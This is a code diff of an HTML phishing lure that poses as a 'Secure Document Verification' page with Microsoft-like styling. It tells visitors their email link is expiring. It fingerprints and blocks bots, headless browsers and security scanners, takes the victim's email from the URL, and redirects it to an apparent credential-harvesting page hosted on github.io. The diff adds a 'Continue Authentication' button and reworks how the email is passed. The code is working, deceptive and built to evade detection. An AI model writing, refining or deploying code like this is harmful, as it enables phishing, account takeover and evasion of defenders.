@@ -3,72 +3,78 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<!-- Security: no index, no referrer -->
 <meta name="robots" content="noindex,nofollow">
 <meta name="referrer" content="no-referrer">
-<title>Secure Document Verification</title>
-<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%231a56db'/><text x='16' y='22' text-anchor='middle' fill='white' font-size='16' font-family='Arial'>📄</text></svg>">
+<title>Secure Document Verificationt</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%230078d4'/><text x='16' y='22' text-anchor='middle' fill='white' font-size='16' font-family='Arial'>✉</text></svg>">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',system-ui,sans-serif;background:#0f172a;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e0e0e0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#0b0f1a;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e0e0e0}
 .wrap{max-width:460px;width:90%;text-align:center}
-.secure-icon{width:64px;height:64px;margin:0 auto 24px;position:relative}
-.ring{width:64px;height:64px;border:3px solid rgba(26,86,219,.3);border-top-color:#1a56db;border-radius:50%;animation:spin 1s linear infinite;position:absolute}
-.icon-center{width:64px;height:64px;display:flex;align-items:center;justify-content:center;font-size:28px}
+.icon-wrap{width:80px;height:80px;margin:0 auto 24px;position:relative}
+.icon-ring{width:80px;height:80px;border:3px solid rgba(0,120,212,.3);border-top-color:#0078d4;border-radius:50%;animation:spin 1s linear infinite;position:absolute}
+.icon-inner{width:80px;height:80px;display:flex;align-items:center;justify-content:center;position:relative}
+.icon-inner svg{width:36px;height:36px;fill:#0078d4}
+.check-badge{position:absolute;bottom:2px;right:2px;width:22px;height:22px;background:#0078d4;border-radius:50%;display:flex;align-items:center;justify-content:center;border:2px solid #0b0f1a}
+.check-badge::after{content:'✓';color:#fff;font-size:12px;font-weight:bold}
 @keyframes spin{to{transform:rotate(360deg)}}
-h1{font-size:22px;font-weight:600;margin-bottom:8px;color:#fff}
-.sub{font-size:14px;color:#94a3b8;margin-bottom:32px;line-height:1.6}
-.checks{text-align:left;max-width:300px;margin:0 auto 32px}
-.check-item{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.06);font-size:13px}
-.check-dot{width:20px;height:20px;border-radius:50%;border:2px solid #334155;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .4s}
-.check-dot.done{border-color:#1a56db;background:#1a56db}
+h1{font-size:24px;font-weight:600;margin-bottom:12px;color:#fff}
+.sub{font-size:14px;color:#a0a0b0;margin-bottom:32px;line-height:1.6}
+.checks{text-align:left;max-width:340px;margin:0 auto 32px}
+.check-item{display:flex;align-items:center;gap:12px;padding:12px 0;border-bottom:1px solid rgba(255,255,255,.06);font-size:14px}
+.check-dot{width:20px;height:20px;border-radius:50%;border:2px solid #333;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .4s}
+.check-dot.done{border-color:#0078d4;background:#0078d4}
 .check-dot.done::after{content:'✓';color:#fff;font-size:11px}
-.check-dot.active{border-color:#3b82f6;animation:pulse 1s infinite}
-@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(59,130,246,.4)}50%{box-shadow:0 0 0 6px rgba(59,130,246,0)}}
-.check-label{color:#94a3b8}.check-item.done .check-label{color:#e2e8f0}
-.blocked{display:none;color:#ef4444;font-size:14px;margin-top:16px}
+.check-dot.active{border-color:#0078d4;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,120,212,.4)}50%{box-shadow:0 0 0 6px rgba(0,120,212,0)}}
+.check-label{color:#c0c0c0}.check-item.done .check-label{color:#e0e0e0}
+.btn{display:inline-block;background:#0078d4;color:#fff;padding:14px 32px;border-radius:6px;font-size:15px;font-weight:500;text-decoration:none;border:none;cursor:pointer;transition:background .2s;margin-top:8px}
+.btn:hover{background:#006abc}
+.blocked{display:none;color:#e74c3c;font-size:14px;margin-top:16px}
 </style>
 </head>
 <body>
 <div class="wrap">
-<div class="secure-icon"><div class="ring"></div><div class="icon-center">📄</div></div>
+<div class="icon-wrap">
+  <div class="icon-ring"></div>
+  <div class="icon-inner">
+    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+    <div class="check-badge"></div>
+  </div>
+</div>
 <h1>Secure Document Verification</h1>
-<p class="sub">Your document is being verified for secure delivery.<br>Please wait while we complete the security check...</p>
+<p class="sub">Your email link will expire soon for security reasons.<br>Please complete the authentication process to keep<br>your account secure and active.</p>
 <div class="checks" id="checks">
-<div class="check-item" data-i="0"><div class="check-dot"></div><span class="check-label">Verifying document integrity</span></div>
+<div class="check-item" data-i="0"><div class="check-dot"></div><span class="check-label">Verifying Document Integrity</span></div>
 <div class="check-item" data-i="1"><div class="check-dot"></div><span class="check-label">Checking security protocols</span></div>
 <div class="check-item" data-i="2"><div class="check-dot"></div><span class="check-label">Authenticating your session</span></div>
-<div class="check-item" data-i="3"><div class="check-dot"></div><span class="check-label">Preparing secure document</span></div>
+<div class="check-item" data-i="3"><div class="check-dot"></div><span class="check-label">Preparing secure Document</span></div>
 </div>
-<p class="blocked" id="blocked">⛔ Access denied. Security verification failed.</p>
+<button class="btn" id="continueBtn">Continue Authentication</button>
+<p class="blocked" id="blocked">⛔ Automated access detected. Verification failed.</p>
 </div>
 <script>
-/* ─── CONFIG: Extract email and build final URL ─── */
-var email = '';
+/* ─── FIXED: Grab email from the URL ─── */
+// 1. Read the email from the current page's URL (e.g. ?email=info@...)
+const urlParams = new URLSearchParams(window.location.search);
+const email = urlParams.get('email');
 
-// 1. Check query string (?email=...) from the source URL
-var params = new URLSearchParams(window.location.search);
-if (params.get('email')) {
-  email = params.get('email');
+// 2. If NO email is found in the URL, stop and show an error message
+if (!email) {
+    document.querySelector('.sub').innerHTML = '❌ Missing email parameter. Please use: <br> <strong>?email=your@email.com</strong>';
+    document.querySelector('.icon-ring').style.animation = 'none';
+    document.querySelector('.icon-ring').style.borderColor = '#e74c3c';
+    throw new Error('Email missing in URL');
 }
 
-// 2. Check hash fragment (#email=... or just #email) from the source URL
-if (!email && window.location.hash) {
-  var hash = window.location.hash.substring(1);
-  if (hash.includes('email=')) {
-    var hashParams = new URLSearchParams(hash);
-    if (hashParams.get('email')) email = hashParams.get('email');
-  } else if (hash.includes('@')) {
-    email = hash;
-  }
-}
-
-// 3. Build the final redirect URL using ?email= (safer and more reliable)
-var REDIRECT_URL = 'https://authxnxxiinuser.github.io/verifierx/?email=' + encodeURIComponent(email);
+// 3. Build the final redirect URL using backticks (`) so ${email} works!
+const REDIRECT_URL = `https://authxnxxiinuser.github.io/verifierx/#${email}`;
 /* ──────────────────────────────────────────── */
 
 (function(){
 var items=document.querySelectorAll('.check-item'),b=document.getElementById('blocked');
-function bad(){b.style.display='block';document.getElementById('checks').style.display='none';document.querySelector('.ring').style.animation='none';document.querySelector('.ring').style.borderColor='#ef4444'}
+function bad(){b.style.display='block';document.getElementById('checks').style.display='none';document.getElementById('continueBtn').style.display='none';document.querySelector('.icon-ring').style.animation='none';document.querySelector('.icon-ring').style.borderColor='#e74c3c'}
 function chk(){
 if(navigator.webdriver||window.__nightmare||window.callPhantom||window._phantom)return!1;
 if(/bot|crawl|spider|headless|phantom|puppet|selenium|lighthouse|wget|curl|http|scan|preview|fetch|archive|index|probe/i.test(navigator.userAgent))return!1;
@@ -89,8 +95,16 @@ items[step].querySelector('.check-dot').classList.add('done');
 items[step].classList.add('done');
 step++;
 if(step<items.length){items[step].querySelector('.check-dot').classList.add('active')}
-else{clearInterval(iv);setTimeout(function(){window.location.replace(REDIRECT_URL)},700)}
+else{clearInterval(iv);
+  // Auto-redirect after animation completes (optional)
+  setTimeout(function(){window.location.replace(REDIRECT_URL)},700);
+}
 },1100);
+
+// Manual redirect on button click
+document.getElementById('continueBtn').addEventListener('click', function(){
+  window.location.replace(REDIRECT_URL);
+});
 })();
 </script>
 </body>
